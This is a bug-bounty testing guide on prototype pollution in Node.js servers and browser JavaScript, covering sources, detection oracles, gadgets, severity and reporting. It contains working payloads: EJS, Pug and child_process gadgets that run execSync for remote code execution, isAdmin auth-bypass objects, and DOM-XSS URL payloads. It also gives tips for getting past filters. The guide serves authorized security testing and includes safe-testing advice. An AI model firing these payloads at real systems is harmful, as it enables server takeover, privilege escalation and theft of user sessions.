# Prototype Pollution — Advanced Testing Guide

**Author:** x8bitranjit
**Class:** Prototype Pollution (server-side Node.js **and** client-side browser JavaScript)
**Impact ceiling:** **RCE** (server-side, via gadgets) · **DOM XSS** (client-side) · **authentication/authorization bypass** · **DoS**.
**Primary CWE:** CWE-1321 (Improperly Controlled Modification of Object Prototype Attributes — "Prototype Pollution").

> ⚠️ **Advanced guide.** Get the fundamentals first from **PortSwigger Web Security Academy — Prototype pollution** (client + server), **Gareth Heyes' server-side prototype pollution research**, **Olivier Arteau "Prototype pollution attacks in NodeJS" (NorthSec 2018)**, **HackTricks — Prototype Pollution**, and **PayloadsAllTheThings**. This guide assumes you understand JS prototypal inheritance — it teaches you how to find the *source*, land a *gadget*, and prove *RCE/XSS*.

---

## Read this first — why prototype pollution is a top-tier JS bug

Every JavaScript object inherits from `Object.prototype`. If an attacker can add a property to `Object.prototype`, that property silently appears on **every object in the process** — including ones the app creates later and reads without checking. You've effectively injected a **global variable the developer never declared**. When some other code path reads that undeclared property to decide *what command to spawn*, *what HTML to render*, or *whether you're an admin*, your injected value takes over → **RCE, DOM-XSS, or auth bypass**.

Why it pays **High/Critical**:
- **Server-side (Node) → RCE.** A pollution source (`_.merge`, `$.extend(true)`, `_.set`) plus a known **gadget** (child_process options, EJS/Pug template options) is remote code execution. This is how Kibana (CVE-2019-7609), many npm apps, and countless bounty targets fell.
- **Client-side → DOM-XSS.** Pollute a config property that a library later reads into a `script.src`/`innerHTML`/`srcdoc` sink → XSS that often bypasses input filters entirely.
- **Logic/auth bypass with no gadget needed.** Pollute `isAdmin`/`role`/`isAuthenticated` and any object that checks `obj.isAdmin` *without owning the property* now says true.
- It's **framework-wide**: one vulnerable merge poisons the whole process, so the blast radius is the entire app.

**Report impact, not the pollution.** "`Object.prototype.foo` becomes `bar`" is the *primitive*. "I executed `id` on your server" / "I ran script in the victim's session" / "I became admin" is the finding. **Prototype Pollution = Source + Gadget.** Always drive to the gadget and the concrete impact.

**The core mental model:**
1. **Source** — the pollution primitive: an operation that recursively walks attacker-controlled keys (`__proto__`, `constructor.prototype`) into an object it merges/sets/clones/parses.
2. **Gadget** — a sink elsewhere that reads an *undeclared* property (that the attacker now controls via the prototype) and does something dangerous with it.
3. **Impact = Source + Gadget.** A source alone is a *primitive*; you must find the gadget to prove RCE/XSS. (Server-side, even a source alone can be Medium via property injection, but chase the gadget.)

---

## Master Testing Sequence

1. **Identify the environment** — Node server-side, browser client-side, or both (many apps are vulnerable in both).
2. **Find the source** — a recursive merge, path-based set, deep clone, or query-string/JSON parse that accepts attacker keys.
3. **Confirm pollution** — client: `Object.prototype.x` in console; server: the **blind SSPP oracles** (`json spaces`, `status`, `exposedHeaders`, charset…).
4. **Find a gadget** — child_process / template engine / library / logic property → escalate to RCE, DOM-XSS, or auth bypass.
5. **Validate → severity → SAFE-PoC** (pollution is **global + persistent** server-side — extreme care) **→ report.**

---

# PART I — Find the source (the pollution primitive)

## 1.1 The payload roots

Three ways to reach the prototype from a key path:

```
__proto__                         # direct: obj.__proto__ === Object.prototype
constructor.prototype             # obj.constructor.prototype === Object.prototype
__proto__.__proto__               # occasionally needed through arrays/nested
```

So the polluting keys are `__proto__` **or** `constructor` then `prototype`. Filters that block only `__proto__` are bypassed with `constructor.prototype`.

## 1.2 Vulnerable operations (what to look for in code / behavior)

| Operation | Examples | Notes |
|-----------|----------|-------|
| **Recursive merge / deep extend** | `_.merge`, `_.mergeWith`, `_.defaultsDeep`, `$.extend(true, …)`, `Hoek.merge`, hand-rolled `merge(target, source)` | The #1 source. Recurses into `source.__proto__`. |
| **Path-based set** | `_.set(obj,'a.b.c',v)`, `_.setWith`, `dot-prop`, `object-path`, `mpath` | `_.set(o,'__proto__.x',v)` pollutes. |
| **Deep clone** | `_.cloneDeep`, custom clone | If it copies `__proto__`. |
| **Query-string parse** | `qs` (`extended:true`), `query-string`, Express `req.query` | `?__proto__[x]=y` → `{__proto__:{x:'y'}}`. |
| **JSON body + merge** | `JSON.parse(body)` then merged into config/user | `{"__proto__":{"x":"y"}}`. |
| **`Object.assign` into a fresh object then deep-op** | nested cases | shallow assign alone doesn't pollute; nested merges do. |

Grep the target's JS/bundles for: `merge(`, `extend(`, `defaultsDeep`, `_.set`, `setWith`, `cloneDeep`, `mergeWith`, `deepAssign`, `dot-prop`, `object-path`, and the libs' versions (old lodash/jQuery/minimist/yargs-parser are CVE-ridden).

## 1.3 Input vectors

- **JSON body:** `{"__proto__":{"polluted":"x"}}` / `{"constructor":{"prototype":{"polluted":"x"}}}`
- **Query string:** `?__proto__[polluted]=x` · `?__proto__.polluted=x` · `?constructor[prototype][polluted]=x`
- **Form / multipart:** `__proto__[polluted]=x`
- **Path/route params, headers, cookies** if parsed into objects.
- **Nested app data:** user profile JSON, saved settings, webhook payloads (→ second-order).

---

# PART II — Detection

## 2.1 Client-side detection (browser)

Fast and visible:
```
# navigate with a URL pollution vector, then check the console:
https://target/?__proto__[polluted]=yes
https://target/?__proto__.polluted=yes
https://target/#__proto__[polluted]=yes        # hash-based (client router)
> Object.prototype.polluted        // "yes"  => POLLUTED
```
Or via a JSON POST the client merges. **DOM Invader** (Burp's built-in browser) automates source discovery *and* gadget scanning — turn on "Prototype pollution" and let it crawl.

## 2.2 Server-side detection (SSPP — usually blind)

Server-side pollution has no console, so use **side-effect oracles** — pollute a config property that a framework reads globally, then observe the response change. Send the pollution (JSON body or query), then a normal request, and diff:

```jsonc
// Express "json spaces" — pollutes JSON.stringify indentation of ALL later JSON responses:
{"__proto__":{"json spaces":10}}
// then any JSON response comes back indented with 10 spaces  => POLLUTED (strongest, cleanest oracle)

// status override (some apps):
{"__proto__":{"status":510}}          // a later response returns status 510

// CORS reflection:
{"__proto__":{"exposedHeaders":["x8bit"]}}   // Access-Control-Expose-Headers: x8bit appears

// content-type / charset:
{"__proto__":{"content-type":"text/html; charset=x8bit"}}

// parameter-limit / bad-type crash oracle (400/500 flip):
{"__proto__":{"parameterLimit":1}}    // subsequent multi-param requests error
```

The **`json spaces`** oracle is the most reliable: baseline a JSON response (no indentation), send the pollution, re-fetch → if it's now indented, confirmed. Automate with `poc/pp_probe.py`.

> **CAUTION:** server-side pollution is **process-global and persists until restart**. Use benign, reversible-ish markers, avoid properties that break the app, and never pollute production into an outage. See SAFE-PoC.

## 2.3 Confirming it's genuinely prototype pollution

- The injected property must appear on **objects the attacker didn't create** (a fresh `{}` has it). Client: `({}).polluted`. Server: the oracle response changed for an *unrelated* request.
- Rule out plain reflected input (that's not pollution). Pollution is *global*.

---

# PART III — Server-side exploitation (→ RCE)

Once you have a source + confirmed pollution, land a **gadget**. The famous ones:

## 3.1 `child_process` gadgets (the RCE workhorse)

When the app later calls `child_process.spawn/exec/execFile/fork` and builds the **options** object fresh (so missing keys fall through to the polluted prototype), inject execution-controlling options:

```jsonc
// NODE_OPTIONS + --require: force Node to require an attacker file at child spawn
{"__proto__":{"env":{"NODE_OPTIONS":"--require /proc/self/environ"},"argv0":"node"}}
// classic shell gadget (spawn with shell picks up polluted options):
{"__proto__":{"shell":"node","argv0":"console.log(1)//"}}   // exact keys depend on the call site
// spawn options prototype gadget -> command via 'shell'/'env'/'NODE_OPTIONS'
{"__proto__":{"shell":"/proc/self/exe","argv0":"-e","NODE_OPTIONS":"--eval=require('child_process').execSync('id')"}}
```
The reliable modern chain: pollute **`NODE_OPTIONS`** to `--require=/path` (or `--import`) and get an attacker-controlled file required into the next spawned Node process — combine with a **file-write/upload** ([File Upload](#/fileupload/guide)) or `/proc/self/*`. Exact option keys depend on the sink; use the gadget list in the arsenal.

## 3.2 Template-engine gadgets (very common RCE)

Server-side template engines read compile options off a plain object → pollute those options:

```jsonc
// EJS — outputFunctionName gadget (RCE):
{"__proto__":{"outputFunctionName":"x;process.mainModule.require('child_process').execSync('id');//"}}
// EJS alternates: escapeFunction, compileDebug+client, localsName
// Pug/Jade:
{"__proto__":{"compileDebug":true,"self":true,"line":"process.mainModule.require('child_process').execSync('id')"}}
// Handlebars / Nunjucks / doT — each has documented gadgets (see arsenal + research)
```
If the app renders a template *after* your pollution, these fire on the next render → RCE.

## 3.3 Other library / framework gadgets

`nodemailer`, `ejs`, `pug`, `jade`, `blitz`, `vm2` escapes, `mongoose`/`mquery`, `ansi-html`, `undici`/proxy options, `require('...')` cache — the ecosystem has a large gadget catalog (PortSwigger's server-side PP research maintains one). Match the gadget to the libraries the target actually loads.

## 3.4 Authentication / authorization bypass (no gadget needed)

If the app checks a property on an object it doesn't own:
```jsonc
{"__proto__":{"isAdmin":true}}
{"__proto__":{"role":"admin"}}
{"constructor":{"prototype":{"isAuthenticated":true}}}
```
Any later `if (user.isAdmin)` where `user` lacks its own `isAdmin` now reads the polluted `true` → **privilege escalation**. This is a clean, high-value, gadget-free win — test it early.

## 3.5 DoS

Polluting a property that breaks object handling process-wide (e.g., a getter that throws, or a type the framework mis-uses) crashes or degrades the whole app. Real but **destructive** — only demonstrate on a lab/own instance; note the risk, don't nuke prod.

## 3.6 SSPP without a known gadget — property injection

Even without RCE, server-side pollution can inject into responses: **CORS** (`exposedHeaders`, `origin`), **cache** headers, **redirects** (a polluted `location`), or reflected config → chain to XSS/open-redirect/cache-poisoning ([Host Header](#/hostheader/guide), [CORS](#/cors/guide)). Medium–High depending on what you can inject.

---

# PART IV — Client-side exploitation (→ DOM XSS)

## 4.1 The gadget concept

A client-side gadget is a script that reads an **undeclared config property** and passes it to a dangerous sink. You pollute that property via the URL/JSON, the library reads it off the prototype, and it lands in the sink → XSS.

```
Sinks that become XSS via a polluted config value:
  element.innerHTML / outerHTML     <-  a polluted "html"/"content" option
  script.src / iframe.src           <-  a polluted "src"/"url"/"baseURL"
  iframe.srcdoc                     <-  a polluted "srcdoc"
  eval / setTimeout(string) / Function
  location / a.href                 <-  open redirect / javascript:
```

## 4.2 Known library gadgets

Many popular libraries have documented client-side PP gadgets (PortSwigger's "widespread prototype pollution gadgets" research): **jQuery** (`$.extend`, `htmlPrefilter`, `$(html)`), **Google Analytics / gtag**, **Closure**, **Wistia**, **Segment/analytics.js**, sanitizer configs (**DOMPurify** `ALLOWED_ATTR`/`RETURN_DOM`, sanitize-html), **Vue/React** config edges, **AdobeDTM/Adobe Launch**. Identify the libs loaded, then use the matching gadget.

Example (generic pattern):
```
https://target/?__proto__[src]=data:,alert(document.domain)         # a lib reads config.src into a script
https://target/?__proto__[html]=<img src=x onerror=alert(1)>        # a lib reads config.html into innerHTML
https://target/?__proto__[srcdoc]=<script>alert(1)</script>
```

## 4.3 Workflow

1. Find a client-side **source** (URL/JSON the client merges). Confirm with `Object.prototype.x`.
2. Enumerate loaded libraries → look up their gadgets.
3. Pollute the gadget property with an XSS payload → trigger the sink (often just a reload). **DOM Invader** automates 1–3.

→ **Impact:** DOM-XSS (often filter-bypassing) → session theft/ATO in the victim's context.

---

# PART V — Escalate & chain ("you found X → do Y")

| You found | Do this | Severity |
|-----------|---------|----------|
| Client-side source (`Object.prototype.x` set) | Find a loaded-library gadget → pollute `src`/`html`/`srcdoc` → **DOM-XSS** | High |
| Server-side SSPP confirmed (json spaces) | Match a gadget: `child_process`/EJS/Pug → **RCE**; or `isAdmin` → **privesc** | Critical/High |
| Source but no known gadget (server) | Property-inject into CORS/redirect/cache → chain to XSS/open-redirect/cache-poisoning | Medium/High |
| `__proto__` blocked | Use `constructor.prototype` / `constructor[prototype][x]` | — |
| Auth object checks `obj.isAdmin` | `{"__proto__":{"isAdmin":true}}` → admin | Critical |
| A later `child_process` spawn | Pollute `NODE_OPTIONS`/`shell`/`env` → RCE (pair with file-write) | Critical |

**Chains:** [NoSQL Injection](#/nosqli/guide) (both abuse object keys / `__proto__` in JSON), [File Upload](#/fileupload/guide) (drop the `--require` file for NODE_OPTIONS RCE), [CORS](#/cors/guide) & [Host Header](#/hostheader/guide) (property-injection targets), [XSS](#/xss/guide) (client-side gadget → DOM-XSS escalation), [REST](#/rest/guide) & [GraphQL](#/graphql/guide) (JSON bodies as the pollution vector).

---

# PART VI — Validity, false positives, severity, reporting

## 6.1 False-positive auto-reject table

| Observation | Why it's NOT (yet) a finding | What makes it real |
|-------------|------------------------------|--------------------|
| App reflects `__proto__` in a response | Reflection ≠ pollution | A **fresh** object has the property (`{}.x`) / an SSPP oracle flips |
| `?__proto__[x]=y` returns 200 | No effect shown | `Object.prototype.x==='y'` in console, or the SSPP oracle changes |
| `Object.prototype.x` set but nothing happens | Source only, no gadget | A **gadget** turning it into XSS/RCE/authz — or a concrete property-injection impact |
| SSPP oracle blipped once | Could be caching/jitter | **Repeatable** oracle change vs a clean baseline |
| A library "has a known gadget" | The target may not load it / not reach the sink | You actually **trigger** the sink (XSS fires / command runs) |
| Client pollution via `location.hash` only affects your own tab | Self-XSS unless deliverable | A URL/param an attacker can send that pollutes the **victim's** context |

**Golden rule:** a prototype-pollution *finding* needs a demonstrated **global pollution** (fresh objects carry it / SSPP oracle flips) **plus** a concrete impact (a fired gadget, executed command, admin access, or injected response). A set property with no consequence is a *primitive*, not a bug — keep hunting the gadget.

## 6.2 Severity calibration (CVSS + CWE)

| Scenario | Severity | CWE |
|----------|----------|-----|
| Server-side pollution → **RCE** (gadget) | **Critical (9–10)** | CWE-1321 → CWE-94/78 |
| Prototype pollution → **auth/privilege bypass** (`isAdmin`) | **Critical/High** | CWE-1321 → CWE-287/269 |
| Client-side pollution → **DOM-XSS** (fired) | **High** | CWE-1321 → CWE-79 |
| SSPP property-injection → CORS/redirect/cache abuse | **High/Medium** | CWE-1321 |
| Confirmed global pollution, gadget plausible but unfired | **Medium** | CWE-1321 |
| Source only, no global effect proven | **Low/Info** | CWE-1321 |
| Pollution → DoS (destructive) | **Medium/High** (report carefully) | CWE-1321 → CWE-400 |

## 6.3 SAFE-PoC discipline (prototype pollution is dangerous — read this)

- **Server-side pollution is process-global and persists until the app restarts.** It affects **all users and all requests**, not just yours. Treat it like a live grenade:
  - Use **benign markers** (`json spaces`, a unique nonce property) to prove the primitive — not properties that alter security state for other users.
  - **Never** pollute a property that breaks the app for everyone (DoS) on production; demonstrate DoS only on your own instance.
  - For **auth-bypass** (`isAdmin`), prove it against **your own** session/test account and understand it may briefly affect others — coordinate/limit; prefer a lab if the target is shared prod.
  - For **RCE**, one benign command (`id`/OOB callback) then STOP; don't pollute repeatedly.
  - If you can, note that the pollution needs an app **restart** to clear, and flag that to the program.
- **Client-side:** use an alert/`document.domain` PoC or a benign OOB beacon; deliver via a URL to **your own** test victim; don't weaponize.
- Redact any real tokens; tear down OOB servers; don't leave the prototype polluted longer than needed to prove it.

## 6.4 Reporting

Lead with **Source + Gadget + Impact**. Show: the exact pollution request (JSON/URL), the **proof of global pollution** (fresh-object property or the SSPP oracle diff), and the **gadget firing** (XSS alert / executed command / admin access). Name the vulnerable operation (`_.merge`/`$.extend(true)`/`_.set`) and the fix. Use the report template. Cite CWE-1321 and the library CVE if it's a known-vulnerable dependency.

## 6.5 Real-world references / CVEs

- **Olivier Arteau**, "Prototype pollution attacks in NodeJS applications" (NorthSec 2018) — the origin.
- **PortSwigger / Gareth Heyes** — client-side "widespread prototype pollution gadgets" (2020) + **server-side prototype pollution** detection & gadgets (2022–2023); Academy labs.
- **lodash** CVE-2019-10744 (`defaultsDeep`), CVE-2018-3721/16487; **jQuery** CVE-2019-11358 (`$.extend`); **minimist** CVE-2020-7598; **yargs-parser** CVE-2020-7608; **set-value/merge/deep-set** family.
- **Kibana** CVE-2019-7609 (Timelion prototype pollution → RCE); numerous npm-package and app-level PP→RCE reports on HackerOne.

---

## Companion files
- **[Attack Arsenal](#/prototype/arsenal)** — payloads + gadget catalog + tools.
- **[Testing Checklist](#/prototype/checklist)** — phase-by-phase + auto-reject.
- **the report template** — report skeleton.
- **[Zero to Expert (Q&A)](#/prototype/qa)** — 100-question study + field reference.
- **[PoC Scripts](#/prototype/poc)** — `pp_probe.py` (SSPP oracle detector, control-baselined) · `pp_payloads.py` (payload-matrix generator) · `gadgets_cheat.md`.
